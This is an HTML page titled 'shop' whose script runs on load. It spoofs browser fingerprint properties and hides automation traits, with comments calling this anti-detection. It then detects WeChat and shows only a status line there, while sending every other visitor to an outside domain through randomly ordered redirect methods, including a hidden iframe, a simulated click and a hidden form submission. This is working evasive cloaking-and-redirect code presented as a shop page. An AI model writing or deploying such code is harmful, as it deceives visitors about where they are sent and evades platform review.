<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>shop</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: #fff;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
        }
        .container {
            width: 100%;
            padding: 0;
            height: 100vh;
        }
        .loading {
            padding: 20px;
            font-size: 16px;
            color: #666;
        }
        .status {
            margin-top: 20px;
            font-size: 14px;
            color: #999;
        }
    </style>
    <script>
        // 增强版防检测措施
        (function() {
            // 重写关键属性
            Object.defineProperty(navigator, 'userAgent', {
                get: function() {
                    return 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1';
                },
                configurable: true
            });
            
            // 清除自动化特征
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined,
                configurable: true
            });
            
            // 重写语言属性
            Object.defineProperty(navigator, 'language', {
                get: () => 'zh-CN',
                configurable: true
            });
            
            Object.defineProperty(navigator, 'languages', {
                get: () => ['zh-CN', 'zh'],
                configurable: true
            });
            
            // 删除插件信息
            Object.defineProperty(navigator, 'plugins', {
                get: () => [],
                configurable: true
            });
        })();

        // 增强版微信检测
        function enhancedWeChatCheck() {
            try {
                const checks = [];
                
                // 方法1：UserAgent检测
                checks.push(navigator.userAgent.toLowerCase().includes('micromessenger'));
                
                // 方法2：全局对象检测
                checks.push(typeof WeixinJSBridge !== 'undefined');
                checks.push(typeof wx !== 'undefined');
                checks.push(typeof __wxjs_environment !== 'undefined');
                
                // 方法3：特定API检测
                checks.push(!!navigator.vendor && navigator.vendor.includes('Tencent'));
                
                // 方法4：行为特征检测
                checks.push(!!window.WeixinJSBridge);
                
                return checks.some(Boolean);
            } catch (e) {
                return false;
            }
        }

        // 随机跳转执行器
        function executeRandomRedirect(url) {
            let executed = false;
            let attemptCount = 0;
            
            const methods = [
                { 
                    name: "直接跳转", 
                    method: () => { 
                        window.location.href = url; 
                    } 
                },
                { 
                    name: "替换跳转", 
                    method: () => { 
                        window.location.replace(url); 
                    } 
                },
                { 
                    name: "iframe跳转", 
                    method: () => {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.style.visibility = 'hidden';
                        iframe.style.position = 'absolute';
                        iframe.style.left = '-9999px';
                        iframe.src = url;
                        document.body.appendChild(iframe);
                    } 
                },
                { 
                    name: "模拟点击", 
                    method: () => {
                        const link = document.createElement('a');
                        link.href = url;
                        link.target = '_blank';
                        link.style.display = 'none';
                        document.body.appendChild(link);
                        
                        // 多种点击方式
                        if (link.click) {
                            link.click();
                        } else if (document.createEvent) {
                            const event = document.createEvent('MouseEvents');
                            event.initEvent('click', true, true);
                            link.dispatchEvent(event);
                        }
                    } 
                },
                { 
                    name: "表单提交", 
                    method: () => {
                        const form = document.createElement('form');
                        form.method = 'GET';
                        form.action = url;
                        form.target = '_blank';
                        form.style.display = 'none';
                        document.body.appendChild(form);
                        form.submit();
                    } 
                }
            ];
            
            // 随机打乱执行顺序
            const shuffledMethods = methods.sort(() => Math.random() - 0.5);
            
            // 更新状态显示
            function updateStatus(methodName) {
                attemptCount++;
                const statusEl = document.getElementById('status');
                if (statusEl) {
                    statusEl.innerHTML = `尝试跳转方式 ${attemptCount}: ${methodName}`;
                }
            }
            
            // 执行随机跳转
            shuffledMethods.forEach((methodObj, index) => {
                const delay = (index + 1) * 300 + Math.random() * 200; // 300-500ms间隔
                
                setTimeout(() => {
                    if (!executed) {
                        try {
                            updateStatus(methodObj.name);
                            methodObj.method();
                            executed = true;
                            console.log(`跳转成功: ${methodObj.name}`);
                        } catch (error) {
                            console.log(`跳转失败: ${methodObj.name}`, error);
                        }
                    }
                }, delay);
            });
            
            // 最终保障：5秒后强制跳转
            setTimeout(() => {
                if (!executed) {
                    updateStatus("最终强制跳转");
                    window.location.href = url;
                }
            }, 5000);
        }

        // 主逻辑
        (function main() {
            // 随机延迟执行主逻辑
            const delay = Math.random() * 1000 + 500;
            
            setTimeout(() => {
                const queryString = window.location.search;
                const targetUrl = 'https://phuro2.cc';
                const redirectUrl = targetUrl + queryString;

                // 检测环境并执行相应操作
                if (enhancedWeChatCheck()) {
                    // 微信环境：只显示状态信息
                    document.getElementById('message').innerHTML = `
                        <div class="status">检测到微信环境</div>
                    `;
                } else {
                    // 非微信环境：执行随机跳转
                    document.getElementById('message').innerHTML = `
                        <div class="loading"></div>
                        <div class="status" id="status">初始化跳转程序...</div>
                    `;
                    
                    // 短暂延迟后开始跳转
                    setTimeout(() => {
                        executeRandomRedirect(redirectUrl);
                    }, 800);
                }
            }, delay);
        })();
    </script>
</head>
<body>
    <div class="container">
        <div id="message">
            <div class="loading">loading...</div>
        </div>
    </div>
</body>
</html>
